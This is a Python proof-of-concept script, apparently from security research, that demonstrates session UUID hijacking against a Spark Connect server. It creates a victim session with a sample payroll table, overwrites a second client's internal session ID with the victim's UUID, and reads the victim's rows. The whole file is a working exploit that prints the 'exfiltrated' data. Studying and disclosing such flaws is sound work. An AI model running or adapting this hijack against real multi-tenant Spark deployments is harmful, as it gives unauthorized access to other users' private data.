"""
Attack B: Session UUID Hijacking
Session IDs are client-generated UUIDs with no cryptographic binding.
An observer can extract them from logs/network and inject into another tenant's session.
We demonstrate using two separate SparkSession objects with different UUIDs.
"""

import time
import uuid
from pyspark.sql import SparkSession

def make_fresh_session(host, port):
    """Force a brand-new session (not getOrCreate which reuses)."""
    SparkSession._instantiatedSession = None
    s = SparkSession.builder.remote(f"sc://{host}:{port}").create()
    return s

def run_attack_b(host="localhost", port=15002, verbose=True):
    results = {"attack": "B", "description": "Session UUID hijacking"}
    t0 = time.time()

    # --- Victim session ---
    spark_victim = make_fresh_session(host, port)
    victim_session_id = spark_victim._client._session_id
    if verbose:
        print(f"[+] Victim session_id: {victim_session_id}")

    # Victim creates private data
    spark_victim.sql("CREATE DATABASE IF NOT EXISTS victim_private")
    spark_victim.sql("""
        CREATE TABLE IF NOT EXISTS victim_private.payroll (
            emp_id INT, salary DOUBLE, bonus DOUBLE
        ) USING parquet
    """)
    spark_victim.sql("INSERT INTO victim_private.payroll VALUES (101, 95000.0, 12000.0)")
    spark_victim.sql("INSERT INTO victim_private.payroll VALUES (102, 110000.0, 15000.0)")
    if verbose:
        print(f"[+] Victim created private payroll table")

    # --- Attacker session (different UUID) ---
    SparkSession._instantiatedSession = None
    spark_attacker = make_fresh_session(host, port)
    attacker_orig_id = spark_attacker._client._session_id
    if verbose:
        print(f"[+] Attacker original session_id: {attacker_orig_id}")
        print(f"[+] IDs are different: {victim_session_id != attacker_orig_id}")

    # Attacker has observed victim's UUID (from network traffic - no TLS = plaintext protobuf)
    # Inject it
    spark_attacker._client._session_id = victim_session_id
    if verbose:
        print(f"[+] Attacker hijacked session_id to: {victim_session_id}")

    # Attacker now reads victim's data
    try:
        rows = spark_attacker.sql("SELECT * FROM victim_private.payroll ORDER BY emp_id").collect()
        results["rows_exfiltrated"] = len(rows)
        results["exfiltrated_data"] = [(r.emp_id, r.salary, r.bonus) for r in rows]
        results["success"] = True
        if verbose:
            print(f"[+] Attacker exfiltrated {len(rows)} rows from victim's payroll:")
            for r in rows:
                print(f"    emp_id={r.emp_id}  salary={r.salary}  bonus={r.bonus}")
    except Exception as e:
        results["success"] = False
        results["error"] = str(e)
        if verbose:
            print(f"[-] Failed: {e}")

    # Restore attacker session and cleanup
    spark_attacker._client._session_id = attacker_orig_id
    try:
        spark_victim.sql("DROP DATABASE IF EXISTS victim_private CASCADE")
    except Exception:
        pass
    spark_victim.stop()
    spark_attacker.stop()

    results["victim_session_id"] = victim_session_id
    results["attacker_original_id"] = attacker_orig_id
    results["total_ms"] = round((time.time() - t0) * 1000, 1)
    return results

if __name__ == "__main__":
    res = run_attack_b()
    print(f"\n[RESULT] Attack B: {'SUCCEEDED' if res['success'] else 'FAILED'}")
    if res.get("success"):
        print(f"  Victim UUID:   {res['victim_session_id']}")
        print(f"  Attacker UUID: {res['attacker_original_id']}")
        print(f"  Exfiltrated {res['rows_exfiltrated']} payroll rows")
    print(f"  Total time: {res['total_ms']} ms")
